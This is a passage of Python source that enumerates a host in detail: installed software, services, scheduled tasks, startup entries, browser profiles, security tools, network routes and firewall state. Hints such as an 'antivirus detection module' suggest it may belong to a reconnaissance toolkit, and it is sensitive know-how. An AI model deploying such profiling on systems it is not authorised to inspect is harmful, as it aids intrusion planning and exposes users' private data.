                                program_info['install_date'] = winreg.QueryValueEx(subkey, 'InstallDate')[0]
                            except:
                                pass
                            
                            try:
                                program_info['install_location'] = winreg.QueryValueEx(subkey, 'InstallLocation')[0]
                            except:
                                pass
                            
                            try:
                                program_info['uninstall_string'] = winreg.QueryValueEx(subkey, 'UninstallString')[0]
                            except:
                                pass
                            
                            programs.append(program_info)
                            winreg.CloseKey(subkey)
                            
                        except:
                            continue
                    
                    winreg.CloseKey(key)
                    
                except:
                    continue
        
        except Exception as e:
            logger.error(f"[!] Windows programs error: {e}")
        
        # Sort by name
        programs.sort(key=lambda x: x.get('name', '').lower())
        return programs
    
    def _get_linux_installed_packages(self) -> List[Dict[str, str]]:
        """Get Linux installed packages"""
        packages = []
        
        # Try different package managers
        package_managers = [
            ('dpkg', ['dpkg', '-l'], self._parse_dpkg_output),
            ('rpm', ['rpm', '-qa', '--queryformat', '%{NAME}\t%{VERSION}\t%{RELEASE}\t%{INSTALLTIME}\n'], 
             self._parse_rpm_output),
            ('pacman', ['pacman', '-Q'], self._parse_pacman_output),
            ('apk', ['apk', 'info', '-v'], self._parse_apk_output),
            ('snap', ['snap', 'list'], self._parse_snap_output),
            ('flatpak', ['flatpak', 'list', '--app'], self._parse_flatpak_output)
        ]
        
        for pkg_type, cmd, parser in package_managers:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    parsed = parser(result.stdout)
                    for pkg in parsed:
                        pkg['type'] = pkg_type
                        packages.append(pkg)
                    break  # Stop at first successful package manager
            except:
                continue
        
        return packages
    
    def _parse_dpkg_output(self, output: str) -> List[Dict[str, str]]:
        """Parse dpkg output"""
        packages = []
        lines = output.split('\n')[5:]  # Skip header
        
        for line in lines:
            if line.startswith('ii '):  # Installed packages
                parts = line.split()
                if len(parts) >= 3:
                    packages.append({
                        'name': parts[1],
                        'version': parts[2],
                        'architecture': parts[3] if len(parts) > 3 else ''
                    })
        
        return packages
    
    def _parse_rpm_output(self, output: str) -> List[Dict[str, str]]:
        """Parse rpm output"""
        packages = []
        
        for line in output.strip().split('\n'):
            parts = line.split('\t')
            if len(parts) >= 3:
                packages.append({
                    'name': parts[0],
                    'version': parts[1],
                    'release': parts[2],
                    'install_time': parts[3] if len(parts) > 3 else ''
                })
        
        return packages
    
    def _parse_pacman_output(self, output: str) -> List[Dict[str, str]]:
        """Parse pacman output"""
        packages = []
        
        for line in output.strip().split('\n'):
            parts = line.split()
            if len(parts) >= 2:
                packages.append({
                    'name': parts[0],
                    'version': parts[1]
                })
        
        return packages
    
    def _parse_apk_output(self, output: str) -> List[Dict[str, str]]:
        """Parse apk output"""
        packages = []
        
        for line in output.strip().split('\n'):
            if '-' in line:
                name_version = line.split('-')
                if len(name_version) >= 2:
                    packages.append({
                        'name': '-'.join(name_version[:-1]),
                        'version': name_version[-1]
                    })
        
        return packages
    
    def _parse_snap_output(self, output: str) -> List[Dict[str, str]]:
        """Parse snap output"""
        packages = []
        lines = output.split('\n')[1:]  # Skip header
        
        for line in lines:
            if line.strip():
                parts = line.split()
                if len(parts) >= 2:
                    packages.append({
                        'name': parts[0],
                        'version': parts[1],
                        'rev': parts[2] if len(parts) > 2 else '',
                        'tracking': parts[3] if len(parts) > 3 else '',
                        'publisher': parts[4] if len(parts) > 4 else ''
                    })
        
        return packages
    
    def _parse_flatpak_output(self, output: str) -> List[Dict[str, str]]:
        """Parse flatpak output"""
        packages = []
        lines = output.split('\n')[1:]  # Skip header
        
        for line in lines:
            if line.strip():
                parts = line.split('\t')
                if len(parts) >= 3:
                    packages.append({
                        'name': parts[0],
                        'application_id': parts[1],
                        'version': parts[2]
                    })
        
        return packages
    
    def _get_macos_installed_packages(self) -> List[Dict[str, str]]:
        """Get macOS installed packages"""
        packages = []
        
        # Homebrew packages
        try:
            result = subprocess.run(['brew', 'list', '--versions'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line:
                        parts = line.split()
                        if len(parts) >= 2:
                            packages.append({
                                'name': parts[0],
                                'version': parts[1],
                                'manager': 'homebrew'
                            })
        except:
            pass
        
        # MacPorts packages
        try:
            result = subprocess.run(['port', 'installed'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if ' @' in line:
                        name_version = line.strip().split(' @')
                        if len(name_version) >= 2:
                            packages.append({
                                'name': name_version[0],
                                'version': name_version[1].split()[0],
                                'manager': 'macports'
                            })
        except:
            pass
        
        return packages
    
    def _get_running_services(self) -> Dict[str, List[Dict[str, Any]]]:
        """Get running services categorized"""
        services = {
            'system': [],
            'network': [],
            'security': [],
            'database': [],
            'web': [],
            'other': []
        }
        
        try:
            if platform.system() == 'Windows':
                import wmi
                c = wmi.WMI()
                
                for service in c.Win32_Service():
                    service_info = {
                        'name': service.Name,
                        'display_name': service.DisplayName,
                        'state': service.State,
                        'status': service.Status,
                        'start_mode': service.StartMode,
                        'path': service.PathName,
                        'process_id': service.ProcessId,
                        'start_name': service.StartName
                    }
                    
                    # Categorize service
                    category = 'other'
                    service_lower = service.Name.lower()
                    
                    if any(keyword in service_lower for keyword in ['winmgmt', 'eventlog', 'schedule', 'themes']):
                        category = 'system'
                    elif any(keyword in service_lower for keyword in ['dhcp', 'dns', 'w3svc', 'iisadmin', 'http']):
                        category = 'network'
                    elif any(keyword in service_lower for keyword in ['windefend', 'security', 'wscsvc', 'sense']):
                        category = 'security'
                    elif any(keyword in service_lower for keyword in ['sql', 'mysql', 'postgres', 'mongo']):
                        category = 'database'
                    elif any(keyword in service_lower for keyword in ['apache', 'nginx', 'tomcat', 'iis']):
                        category = 'web'
                    
                    services[category].append(service_info)
            
            elif platform.system() == 'Linux':
                # Try systemctl
                try:
                    result = subprocess.run(
                        ['systemctl', 'list-units', '--type=service', '--state=running', '--no-legend'],
                        capture_output=True, text=True
                    )
                    
                    for line in result.stdout.strip().split('\n'):
                        if line:
                            parts = line.split()
                            if len(parts) >= 5:
                                service_name = parts[0]
                                
                                # Get service details
                                try:
                                    result_detail = subprocess.run(
                                        ['systemctl', 'show', service_name, '--property=Description,LoadState,ActiveState,MainPID'],
                                        capture_output=True, text=True
                                    )
                                    
                                    service_info = {'name': service_name}
                                    for detail_line in result_detail.stdout.split('\n'):
                                        if '=' in detail_line:
                                            key, value = detail_line.split('=', 1)
                                            service_info[key.lower()] = value
                                    
                                    # Categorize
                                    category = 'other'
                                    if any(keyword in service_name for keyword in ['network', 'networking', 'NetworkManager']):
                                        category = 'network'
                                    elif any(keyword in service_name for keyword in ['ssh', 'firewalld', 'ufw', 'selinux']):
                                        category = 'security'
                                    elif any(keyword in service_name for keyword in ['mysql', 'postgresql', 'mongod', 'redis']):
                                        category = 'database'
                                    elif any(keyword in service_name for keyword in ['apache', 'nginx', 'httpd', 'lighttpd']):
                                        category = 'web'
                                    
                                    services[category].append(service_info)
                                    
                                except:
                                    pass
                except:
                    pass
        
        except Exception as e:
            logger.error(f"[!] Services error: {e}")
        
        return services
    
    def _get_scheduled_tasks(self) -> Dict[str, List[Dict[str, Any]]]:
        """Get scheduled tasks"""
        tasks = {'windows': [], 'linux': [], 'macos': []}
        
        try:
            if platform.system() == 'Windows':
                tasks['windows'] = self._get_windows_scheduled_tasks()
            elif platform.system() == 'Linux':
                tasks['linux'] = self._get_linux_scheduled_tasks()
            elif platform.system() == 'Darwin':
                tasks['macos'] = self._get_macos_scheduled_tasks()
        
        except Exception as e:
            logger.error(f"[!] Scheduled tasks error: {e}")
        
        return tasks
    
    def _get_windows_scheduled_tasks(self) -> List[Dict[str, Any]]:
        """Get Windows scheduled tasks"""
        tasks = []
        
        try:
            import win32com.client
            scheduler = win32com.client.Dispatch('Schedule.Service')
            scheduler.Connect()
            
            folders = [scheduler.GetFolder('\\')]
            while folders:
                folder = folders.pop(0)
                folders += list(folder.GetFolders(0))
                
                for task in folder.GetTasks(0):
                    task_info = {
                        'name': task.Name,
                        'path': task.Path,
                        'enabled': task.Enabled,
                        'state': task.State,
                        'last_run_time': str(task.LastRunTime) if task.LastRunTime else None,
                        'next_run_time': str(task.NextRunTime) if task.NextRunTime else None,
                        'number_of_missed_runs': task.NumberOfMissedRuns,
                        'last_task_result': task.LastTaskResult
                    }
                    
                    # Get trigger info
                    triggers = []
                    for trigger in task.Definition.Triggers:
                        triggers.append(str(trigger.Type))
                    
                    task_info['triggers'] = triggers
                    tasks.append(task_info)
                    
        except:
            pass
        
        return tasks
    
    def _get_linux_scheduled_tasks(self) -> List[Dict[str, Any]]:
        """Get Linux scheduled tasks"""
        tasks = []
        
        # User crontab
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        tasks.append({
                            'type': 'cron',
                            'user': getpass.getuser(),
                            'schedule': line,
                            'source': 'user_crontab'
                        })
        except:
            pass
        
        # System crontabs
        cron_paths = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/etc/cron.hourly/',
            '/etc/cron.daily/',
            '/etc/cron.weekly/',
            '/etc/cron.monthly/'
        ]
        
        for path in cron_paths:
            if os.path.exists(path):
                if os.path.isfile(path):
                    try:
                        with open(path, 'r') as f:
                            content = f.read()
                            tasks.append({
                                'type': 'cron',
                                'file': path,
                                'content': content[:500],
                                'source': 'system_cron'
                            })
                    except:
                        pass
                elif os.path.isdir(path):
                    try:
                        for item in os.listdir(path):
                            item_path = os.path.join(path, item)
                            if os.path.isfile(item_path):
                                try:
                                    with open(item_path, 'r') as f:
                                        content = f.read()
                                        tasks.append({
                                            'type': 'cron',
                                            'file': item_path,
                                            'content': content[:500],
                                            'source': 'system_cron_script'
                                        })
                                except:
                                    pass
                    except:
                        pass
        
        # Systemd timers
        try:
            result = subprocess.run(
                ['systemctl', 'list-timers', '--all', '--no-legend'],
                capture_output=True, text=True
            )
            
            for line in result.stdout.strip().split('\n'):
                if line:
                    parts = line.split()
                    if len(parts) >= 7:
                        tasks.append({
                            'type': 'systemd_timer',
                            'name': parts[6],
                            'next': parts[0],
                            'left': parts[1],
                            'last': parts[2],
                            'passed': parts[3],
                            'unit': parts[5]
                        })
        except:
            pass
        
        return tasks
    
    def _get_macos_scheduled_tasks(self) -> List[Dict[str, Any]]:
        """Get macOS scheduled tasks"""
        tasks = []
        
        # Launch daemons and agents
        launch_paths = [
            '/Library/LaunchDaemons',
            '/Library/LaunchAgents',
            os.path.expanduser('~/Library/LaunchAgents'),
            '/System/Library/LaunchDaemons',
            '/System/Library/LaunchAgents'
        ]
        
        for path in launch_paths:
            if os.path.exists(path):
                try:
                    for item in os.listdir(path):
                        if item.endswith('.plist'):
                            tasks.append({
                                'type': 'launchd',
                                'file': os.path.join(path, item),
                                'name': item
                            })
                except:
                    pass
        
        # Crontab
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        tasks.append({
                            'type': 'cron',
                            'schedule': line,
                            'source': 'user_crontab'
                        })
        except:
            pass
        
        return tasks
    
    def _get_startup_programs(self) -> Dict[str, List[Dict[str, Any]]]:
        """Get startup programs"""
        startups = {'windows': [], 'linux': [], 'macos': []}
        
        try:
            if platform.system() == 'Windows':
                startups['windows'] = self._get_windows_startup_programs()
            elif platform.system() == 'Linux':
                startups['linux'] = self._get_linux_startup_programs()
            elif platform.system() == 'Darwin':
                startups['macos'] = self._get_macos_startup_programs()
        
        except Exception as e:
            logger.error(f"[!] Startup programs error: {e}")
        
        return startups
    
    def _get_windows_startup_programs(self) -> List[Dict[str, Any]]:
        """Get Windows startup programs"""
        programs = []
        
        try:
            import winreg
            
            # Registry startup locations
            startup_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")
            ]
            
            for root, path in startup_locations:
                try:
                    key = winreg.OpenKey(root, path)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            programs.append({
                                'name': name,
                                'command': value,
                                'location': f"{'HKCU' if root == winreg.HKEY_CURRENT_USER else 'HKLM'}\\{path}",
                                'type': 'registry'
                            })
                            i += 1
                        except OSError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
            
            # Startup folders
            startup_folders = [
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            ]
            
            for folder in startup_folders:
                if os.path.exists(folder):
                    for item in os.listdir(folder):
                        item_path = os.path.join(folder, item)
                        programs.append({
                            'name': item,
                            'path': item_path,
                            'type': 'startup_folder'
                        })
        
        except:
            pass
        
        return programs
    
    def _get_linux_startup_programs(self) -> List[Dict[str, Any]]:
        """Get Linux startup programs"""
        programs = []
        
        # System-wide startup
        system_startup = [
            '/etc/rc.local',
            '/etc/init.d/',
            '/etc/rc.d/',
            '/etc/systemd/system/'
        ]
        
        for location in system_startup:
            if os.path.exists(location):
                if os.path.isfile(location):
                    try:
                        with open(location, 'r') as f:
                            content = f.read(1000)
                            programs.append({
                                'name': os.path.basename(location),
                                'path': location,
                                'content_preview': content,
                                'type': 'system_startup'
                            })
                    except:
                        pass
                elif os.path.isdir(location):
                    try:
                        for item in os.listdir(location):
                            if item.endswith('.service') or item.endswith('.sh'):
                                programs.append({
                                    'name': item,
                                    'path': os.path.join(location, item),
                                    'type': 'system_startup_script'
                                })
                    except:
                        pass
        
        # User startup
        user_startup = [
            os.path.expanduser('~/.config/autostart'),
            os.path.expanduser('~/.config/autostart-scripts'),
            os.path.expanduser('~/.xinitrc'),
            os.path.expanduser('~/.bashrc'),
            os.path.expanduser('~/.profile'),
            os.path.expanduser('~/.bash_profile'),
            os.path.expanduser('~/.zshrc')
        ]
        
        for location in user_startup:
            if os.path.exists(location):
                if os.path.isfile(location):
                    try:
                        with open(location, 'r') as f:
                            content = f.read(1000)
                            programs.append({
                                'name': os.path.basename(location),
                                'path': location,
                                'content_preview': content,
                                'type': 'user_startup'
                            })
                    except:
                        pass
                elif os.path.isdir(location):
                    try:
                        for item in os.listdir(location):
                            item_path = os.path.join(location, item)
                            if os.path.isfile(item_path):
                                programs.append({
                                    'name': item,
                                    'path': item_path,
                                    'type': 'user_startup_script'
                                })
                    except:
                        pass
        
        return programs
    
    def _get_macos_startup_programs(self) -> List[Dict[str, Any]]:
        """Get macOS startup programs"""
        programs = []
        
        # Login items
        try:
            result = subprocess.run(
                ['osascript', '-e', 'tell application "System Events" to get the name of every login item'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                items = result.stdout.strip().split(', ')
                for item in items:
                    programs.append({
                        'name': item,
                        'type': 'login_item'
                    })
        except:
            pass
        
        # Launch agents/daemons (already covered in scheduled tasks)
        # User startup scripts
        user_scripts = [
            os.path.expanduser('~/.bashrc'),
            os.path.expanduser('~/.bash_profile'),
            os.path.expanduser('~/.zshrc'),
            os.path.expanduser('~/.profile')
        ]
        
        for script in user_scripts:
            if os.path.exists(script):
                try:
                    with open(script, 'r') as f:
                        content = f.read(1000)
                        programs.append({
                            'name': os.path.basename(script),
                            'path': script,
                            'content_preview': content,
                            'type': 'user_startup_script'
                        })
                except:
                    pass
        
        return programs
    
    def _get_browser_info(self) -> Dict[str, Any]:
        """Get browser information"""
        browsers = {}
        
        # Common browser paths
        browser_paths = {
            'chrome': {
                'windows': [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome'),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), 'Google', 'Chrome')
                ],
                'linux': [
                    os.path.expanduser('~/.config/google-chrome'),
                    '/opt/google/chrome'
                ],
                'darwin': [
                    '/Applications/Google Chrome.app',
                    os.path.expanduser('~/Applications/Google Chrome.app')
                ]
            },
            'firefox': {
                'windows': [
                    os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox'),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), 'Mozilla Firefox')
                ],
                'linux': [
                    os.path.expanduser('~/.mozilla/firefox'),
                    '/usr/lib/firefox'
                ],
                'darwin': [
                    '/Applications/Firefox.app',
                    os.path.expanduser('~/Applications/Firefox.app')
                ]
            },
            'edge': {
                'windows': [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge'),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), 'Microsoft', 'Edge')
                ],
                'linux': [
                    os.path.expanduser('~/.config/microsoft-edge'),
                    '/opt/microsoft/msedge'
                ],
                'darwin': [
                    '/Applications/Microsoft Edge.app',
                    os.path.expanduser('~/Applications/Microsoft Edge.app')
                ]
            },
            'brave': {
                'windows': [
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser'),
                    os.path.join(os.environ.get('PROGRAMFILES', ''), 'BraveSoftware', 'Brave-Browser')
                ],
                'linux': [
                    os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
                    '/opt/brave.com/brave'
                ],
                'darwin': [
                    '/Applications/Brave Browser.app',
                    os.path.expanduser('~/Applications/Brave Browser.app')
                ]
            }
        }
        
        system = platform.system().lower()
        if system == 'darwin':
            system = 'darwin'
        elif system == 'linux':
            system = 'linux'
        else:
            system = 'windows'
        
        for browser_name, paths_by_os in browser_paths.items():
            paths = paths_by_os.get(system, [])
            installed = False
            browser_info = {'installed': False}
            
            for path in paths:
                if os.path.exists(path):
                    installed = True
                    browser_info = {
                        'installed': True,
                        'path': path,
                        'profiles': self._get_browser_profiles(path, browser_name),
                        'version': self._get_browser_version(path, browser_name)
                    }
                    break
            
            browsers[browser_name] = browser_info
        
        return browsers
    
    def _get_browser_profiles(self, browser_path: str, browser_name: str) -> List[str]:
        """Get browser profiles"""
        profiles = []
        
        try:
            if 'chrome' in browser_name.lower() or 'edge' in browser_name.lower() or 'brave' in browser_name.lower():
                # Chrome/Edge/Brave profiles
                user_data = os.path.join(browser_path, 'User Data')
                if os.path.exists(user_data):
                    for item in os.listdir(user_data):
                        if item.startswith('Profile') or item == 'Default':
                            profiles.append(item)
            
            elif 'firefox' in browser_name.lower():
                # Firefox profiles
                profiles_ini = os.path.join(browser_path, 'profiles.ini')
                if os.path.exists(profiles_ini):
                    with open(profiles_ini, 'r') as f:
                        for line in f:
                            if line.startswith('Path='):
                                profiles.append(line.split('=', 1)[1].strip())
        except:
            pass
        
        return profiles
    
    def _get_browser_version(self, browser_path: str, browser_name: str) -> Optional[str]:
        """Get browser version"""
        try:
            if platform.system() == 'Windows':
                # Windows: check registry
                import winreg
                
                reg_paths = {
                    'chrome': r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
                    'firefox': r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
                    'edge': r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
                }
                
                if browser_name in reg_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_paths[browser_name])
                        path, _ = winreg.QueryValueEx(key, None)
                        winreg.CloseKey(key)
                        
                        # Get version from file
                        if os.path.exists(path):
                            import win32api
                            info = win32api.GetFileVersionInfo(path, '\\')
                            version = "%d.%d.%d.%d" % (
                                info['FileVersionMS'] // 65536,
                                info['FileVersionMS'] % 65536,
                                info['FileVersionLS'] // 65536,
                                info['FileVersionLS'] % 65536
                            )
                            return version
                    except:
                        pass
            
            elif platform.system() == 'Linux':
                # Linux: try to execute browser with --version
                browser_executables = {
                    'chrome': 'google-chrome',
                    'firefox': 'firefox',
                    'edge': 'microsoft-edge',
                    'brave': 'brave-browser'
                }
                
                if browser_name in browser_executables:
                    try:
                        result = subprocess.run(
                            [browser_executables[browser_name], '--version'],
                            capture_output=True, text=True
                        )
                        if result.returncode == 0:
                            return result.stdout.strip()
                    except:
                        pass
        
        except:
            pass
        
        return None
    
    def _get_development_tools(self) -> Dict[str, List[str]]:
        """Get development tools"""
        tools = {
            'ides': [],
            'version_control': [],
            'build_tools': [],
            'package_managers': [],
            'languages': []
        }
        
        # Check for common development tools
        dev_tools = {
            'ides': ['code', 'pycharm', 'intellij', 'eclipse', 'netbeans', 'android-studio', 'xcode'],
            'version_control': ['git', 'svn', 'hg', 'cvs'],
            'build_tools': ['make', 'cmake', 'maven', 'gradle', 'ant', 'msbuild'],
            'package_managers': ['npm', 'yarn', 'pip', 'conda', 'gem', 'cargo', 'nuget'],
            'languages': ['python', 'node', 'java', 'javac', 'gcc', 'g++', 'clang', 'rustc', 'go']
        }
        
        for category, tool_list in dev_tools.items():
            for tool in tool_list:
                try:
                    if platform.system() == 'Windows':
                        result = subprocess.run(['where', tool], capture_output=True, text=True)
                    else:
                        result = subprocess.run(['which', tool], capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        tools[category].append(tool)
                except:
                    pass
        
        return tools
    
    def _get_security_software(self) -> Dict[str, List[Dict[str, str]]]:
        """Get security software information"""
        security_sw = {
            'antivirus': [],
            'firewall': [],
            'encryption': [],
            'vpn': [],
            'backup': []
        }
        
        # This will be populated by the antivirus detection module
        # For now, return empty structure
        return security_sw
    
    def _get_network_info(self) -> Dict[str, Any]:
        """Get network information"""
        logger.debug("[*] Collecting network information")
        
        return {
            'connections': self._get_network_connections(),
            'dns_servers': self._get_dns_servers(),
            'arp_table': self._get_arp_table(),
            'routing_table': self._get_routing_table(),
            'firewall_status': self._get_firewall_status(),
            'proxy_settings': self._get_proxy_settings(),
            'network_shares': self._get_network_shares(),
            'listening_ports': self._get_listening_ports(),
            'network_adapters': self._get_network_adapters()
        }
    
    def _get_network_connections(self) -> List[Dict[str, Any]]:
        """Get network connections with process info"""
        connections = []
        
        try:
            for conn in psutil.net_connections(kind='inet'):
                try:
                    conn_info = {
                        'fd': conn.fd,
                        'family': str(conn.family),
                        'type': str(conn.type),
                        'local_address': {
                            'ip': conn.laddr.ip if conn.laddr else None,
                            'port': conn.laddr.port if conn.laddr else None
                        } if conn.laddr else None,
                        'remote_address': {
                            'ip': conn.raddr.ip if conn.raddr else None,
                            'port': conn.raddr.port if conn.raddr else None
                        } if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    }
                    
                    # Get process information
                    if conn.pid:
                        try:
                            process = psutil.Process(conn.pid)
                            with process.oneshot():
                                conn_info['process'] = {
                                    'name': process.name(),
                                    'exe': process.exe(),
                                    'cmdline': ' '.join(process.cmdline()),
                                    'username': process.username(),
                                    'create_time': process.create_time()
                                }
                        except:
                            pass
                    
                    connections.append(conn_info)
                    
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                except Exception as e:
                    logger.debug(f"[!] Connection error: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"[!] Network connections error: {e}")
        
        return connections
    
    def _get_dns_servers(self) -> List[str]:
        """Get DNS servers"""
        dns_servers = []
        
        try:
            if platform.system() == 'Windows':
                # Windows: Get DNS servers from registry
                import winreg
                
                interfaces_key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
                )
                
                for i in range(winreg.QueryInfoKey(interfaces_key)[0]):
                    interface_key_name = winreg.EnumKey(interfaces_key, i)
                    interface_key = winreg.OpenKey(interfaces_key, interface_key_name)
                    
                    try:
                        nameserver, _ = winreg.QueryValueEx(interface_key, 'NameServer')
                        if nameserver:
                            dns_servers.extend(nameserver.split(','))
                    except:
                        pass
                    
                    winreg.CloseKey(interface_key)
                
                winreg.CloseKey(interfaces_key)
            
            elif platform.system() == 'Linux':
                # Linux: Read resolv.conf
                resolv_conf = '/etc/resolv.conf'
                if os.path.exists(resolv_conf):
                    with open(resolv_conf, 'r') as f:
                        for line in f:
                            if line.startswith('nameserver'):
                                dns_servers.append(line.split()[1])
            
            elif platform.system() == 'Darwin':
                # macOS: Use scutil
                result = subprocess.run(
                    ['scutil', '--dns'],
                    capture_output=True, text=True
                )
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'nameserver' in line.lower():
                            parts = line.split()
                            if len(parts) >= 2:
                                dns_servers.append(parts[1])
        
        except Exception as e:
            logger.error(f"[!] DNS servers error: {e}")
        
        # Remove duplicates and empty strings
        dns_servers = list(dict.fromkeys([s.strip() for s in dns_servers if s.strip()]))
        return dns_servers
    
    def _get_arp_table(self) -> List[Dict[str, str]]:
        """Get ARP table"""
        arp_table = []
        
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
                lines = result.stdout.split('\n')
                
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('Interface'):
                        parts = re.split(r'\s+', line)
                        if len(parts) >= 3:
                            arp_table.append({
                                'ip': parts[0],
                                'mac': parts[1],
                                'type': parts[2]
                            })
            
            elif platform.system() in ['Linux', 'Darwin']:
                result = subprocess.run(['arp', '-an'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if '(' in line and ')' in line:
                        ip = line.split('(')[1].split(')')[0]
                        mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                        if mac_match:
                            arp_table.append({
                                'ip': ip,
                                'mac': mac_match.group(0),
                                'type': 'dynamic' if 'dynamic' in line.lower() else 'static'
                            })
        
        except Exception as e:
            logger.error(f"[!] ARP table error: {e}")
        
        return arp_table
    
    def _get_routing_table(self) -> List[Dict[str, Any]]:
        """Get routing table"""
        routes = []
        
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
                lines = result.stdout.split('\n')
                
                # Find the IPv4 Route Table section
                start_idx = -1
                for i, line in enumerate(lines):
                    if 'IPv4 Route Table' in line:
                        start_idx = i + 2
                        break
                
                if start_idx > 0:
                    for line in lines[start_idx:]:
                        line = line.strip()
                        if line and not line.startswith('='):
                            parts = re.split(r'\s+', line)
                            if len(parts) >= 5:
                                routes.append({
                                    'destination': parts[0],
                                    'netmask': parts[1],
                                    'gateway': parts[2],
                                    'interface': parts[3],
                                    'metric': parts[4] if len(parts) > 4 else None
                                })
            
            elif platform.system() in ['Linux', 'Darwin']:
                result = subprocess.run(['netstat', '-rn'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('Kernel') and not line.startswith('Routing'):
                        parts = re.split(r'\s+', line)
                        if len(parts) >= 4:
                            routes.append({
                                'destination': parts[0],
                                'gateway': parts[1],
                                'genmask': parts[2] if len(parts) > 2 else None,
                                'flags': parts[3] if len(parts) > 3 else None,
                                'interface': parts[7] if len(parts) > 7 else None
                            })
        
        except Exception as e:
            logger.error(f"[!] Routing table error: {e}")
        
        return routes
    
    def _get_firewall_status(self) -> Dict[str, Any]:
        """Get firewall status"""
        firewall = {
            'enabled': False,
            'profiles': {},
            'rules_count': 0,
            'type': 'unknown'
        }
        
        try:
            if platform.system() == 'Windows':
                import win32com.client
                
                try:
                    fw_mgr = win32com.client.Dispatch('HNetCfg.FwMgr')
                    firewall['enabled'] = fw_mgr.LocalPolicy.CurrentProfile.FirewallEnabled
                    firewall['type'] = 'Windows Firewall'
                    
                    # Get profile status
                    profiles = ['Domain', 'Private', 'Public']
                    for profile_name in profiles:
                        profile = getattr(fw_mgr.LocalPolicy.CurrentProfile, f'{profile_name}Profile')
                        firewall['profiles'][profile_name.lower()] = {
                            'enabled': profile.FirewallEnabled,
                            'default_inbound': 'Block' if profile.DefaultInboundAction == 0 else 'Allow',
                            'default_outbound': 'Block' if profile.DefaultOutboundAction == 0 else 'Allow'
                        }
                    
                    # Try to get rules count
                    try:
                        fw_policy = fw_mgr.LocalPolicy.CurrentProfile
                        firewall['rules_count'] = fw_policy.Rules.Count
                    except:
                        pass
                        
                except:
                    # Try netsh as fallback
                    result = subprocess.run(
                        ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                        capture_output=True, text=True
                    )
                    
                    if 'ON' in result.stdout:
                        firewall['enabled'] = True
                    
                    # Parse profiles
                    for profile in ['Domain', 'Private', 'Public']:
                        if f'{profile} Profile Settings:' in result.stdout:
                            firewall['profiles'][profile.lower()] = {
                                'enabled': 'ON' in result.stdout.split(f'{profile} Profile Settings:')[1].split('\n')[0]
                            }
            
            elif platform.system() == 'Linux':
                # Check iptables
                try:
                    result = subprocess.run(['iptables', '-L', '-n', '--line-numbers'], capture_output=True, text=True)
                    if result.returncode == 0:
                        firewall['type'] = 'iptables'
                        firewall['enabled'] = len(result.stdout.strip()) > 0
                        
                        # Count rules
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if line.strip() and not line.startswith('Chain') and not line.startswith('target'):
                                firewall['rules_count'] += 1
                except:
                    pass
                
                # Check firewalld
                try:
                    result = subprocess.run(['firewall-cmd', '--state'], capture_output=True, text=True)
                    if 'running' in result.stdout.lower():
                        firewall['type'] = 'firewalld'
                        firewall['enabled'] = True
                        
                        # Get zones and rules
